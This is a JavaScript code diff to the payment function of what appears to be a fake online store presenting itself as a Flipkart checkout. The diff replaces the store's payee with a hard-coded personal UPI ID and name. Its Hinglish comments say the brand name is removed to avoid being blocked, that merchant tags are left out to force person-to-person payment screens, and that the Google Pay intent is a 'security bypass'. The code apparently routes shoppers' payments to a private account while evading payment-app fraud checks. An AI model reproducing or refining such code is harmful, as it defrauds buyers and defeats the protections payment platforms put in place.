@@ -571,30 +571,36 @@ async function confirmPay() {
 }
 
 function payViaApp(app) {
-    const upiID = MY_UPI;
+    const upiID = "john.sa@ptyes"; // Aapki UPI ID
     const amount = sel.price;
-    const name = "Flipkart Store";
-    const txnId = "T" + Math.floor(Math.random() * 1000000000); // Unique Transaction ID
-    
-    // Standard UPI URI
-    let upiURI = `upi://pay?pa=${upiID}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tid=${txnId}&tr=${txnId}`;
+    const name = "Shashikant%20kumar"; // Brand name hatana zaroori hai block se bachne ke liye
+    const trId = "FTX" + Date.now(); // Unique ID taaki duplicate error na aaye
+
+    // Sabse Clean Link (Bina extra merchant tags ke taaki Chat UI khule)
+    const rawLink = `upi://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
 
     if (app === 'phonepe') {
-        // PhonePe Specific Intent
-        window.location.href = upiURI.replace('upi://', 'phonepe://');
-    } 
-    else if (app === 'googlepay') {
-        // Google Pay Intent (Android ke liye ye best chalta hai)
-        window.location.href = `intent://pay?pa=${upiID}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&mode=02#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+        // PhonePe Direct Deep Link (Sabse fast trigger)
+        window.location.href = `phonepe://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
     } 
     else if (app === 'paytm') {
-        window.location.href = upiURI.replace('upi://', 'paytmmp://');
+        // Paytm Chat Style Interface (P2P mode trigger)
+        window.location.href = `paytmmp://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}`;
+    } 
+    else if (app === 'googlepay') {
+        // Google Pay Intent (Android Security Bypass)
+        window.location.href = `intent://pay?pa=${upiID}&pn=${name}&am=${amount}&cu=INR&tr=${trId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+    } else {
+        // Sabhi apps ke liye universal selector
+        window.location.href = rawLink;
     }
-    
-    // Backup: Agar kuch kaam na kare toh simple URI trigger karein
+
+    // FALLBACK: Agar 0.6 second mein app nahi khula, toh selector khole
     setTimeout(() => {
-        window.location.href = upiURI;
-    }, 500);
+        if (!document.hidden) {
+            window.location.href = rawLink;
+        }
+    }, 600);
 }
 
 // 3. Agar koi QR dekhna chahe toh modal dikhao
